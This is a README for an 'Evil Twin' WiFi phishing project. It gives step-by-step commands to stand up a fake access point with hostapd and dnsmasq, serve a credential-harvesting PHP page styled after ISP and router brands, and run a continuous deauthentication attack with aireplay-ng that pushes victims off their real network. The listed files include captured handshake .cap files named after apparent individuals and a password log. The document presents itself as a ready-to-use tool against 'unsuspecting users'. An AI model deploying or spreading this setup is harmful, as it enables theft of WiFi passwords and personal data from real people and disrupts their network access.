# Evil Twin Attack Project (WiFi Fishing)

This project is designed to perform an Evil Twin attack, which involves creating a fake WiFi access point to capture credentials and other sensitive information from unsuspecting users.

## Project Structure

```
index.php
password_log.txt
cap/
    Aditya-01.cap
    AirFiber-01.cap
    charli-01.cap
    iphone-01.cap
    Redmi-01.cap
    tuhin-01.cap
css/
    bootstrap.min.css
img/
    air-fiber.png
    airtel.png
    bsnl.png
    d-link.png
    jio.png
    module_table_bottom.png
    module_table_top.png
    tp-link.png
    vi.png
    wi-fi.png
    wifi-sign.png
js/
    bootstrap.bundle.min.js.js
```

## Dependencies

- PHP
- Apache or any other web server
- Aircrack-ng suite
- Hostapd
- Dnsmasq
- Kali Linux (recommended for its pre-installed network analysis tools)

## Installation and Running

1. **Install Dependencies:**
   Make sure you have PHP, Apache, Aircrack-ng, Hostapd, and Dnsmasq installed on your Kali Linux system.

   ```sh
   sudo apt update
   sudo apt install php apache2 aircrack-ng hostapd dnsmasq
   ```

2. **Clone the Repository:**

   ```sh
   git clone <repository-url>
   cd <repository-directory>
   ```

3. **Move Project Files to Web Server Directory:**

   ```sh
   sudo cp -r * /var/www/html/
   ```

4. **Set Permissions:**

   ```sh
   sudo chown -R www-data:www-data /var/www/html/
   sudo chmod -R 755 /var/www/html/
   ```

5. **Start Apache Server:**

   ```sh
   sudo systemctl start apache2
   sudo systemctl enable apache2
   ```

6. **Configure Hostapd and Dnsmasq:**
   Create and configure `hostapd.conf` and `dnsmasq.conf` files.

   **hostapd.conf:**
   ```sh
   interface=wlan0
   driver=nl80211
   ssid=FakeAP
   hw_mode=g
   channel=6
   macaddr_acl=0
   auth_algs=1
   ignore_broadcast_ssid=0
   ```

   **dnsmasq.conf:**
   ```sh
   interface=wlan0
   dhcp-range=192.168.150.2,192.168.150.30,255.255.255.0,12h
   dhcp-option=3,192.168.150.1
   dhcp-option=6,192.168.150.1
   server=8.8.8.8
   log-queries
   log-dhcp
   listen-address=127.0.0.1
   ```

7. **Start Hostapd and Dnsmasq:**

   ```sh
   sudo hostapd /etc/hostapd/hostapd.conf
   sudo dnsmasq -C /etc/dnsmasq.conf -d
   ```

8. **Run the Attack:**
   Use Aircrack-ng suite to deauthenticate users from the legitimate AP and force them to connect to the fake AP.

   ```sh
   sudo airmon-ng start wlan0
   sudo aireplay-ng --deauth 0 -a <target-AP-MAC> wlan0
   ```

9. **Access the Web Interface:**
   Open your web browser and navigate to `http://localhost/index.php` to monitor captured credentials.

## Usage

- Ensure your wireless adapter supports monitor mode.
- Use the web interface to view captured credentials and other information.

## License

This project is licensed under the MIT License.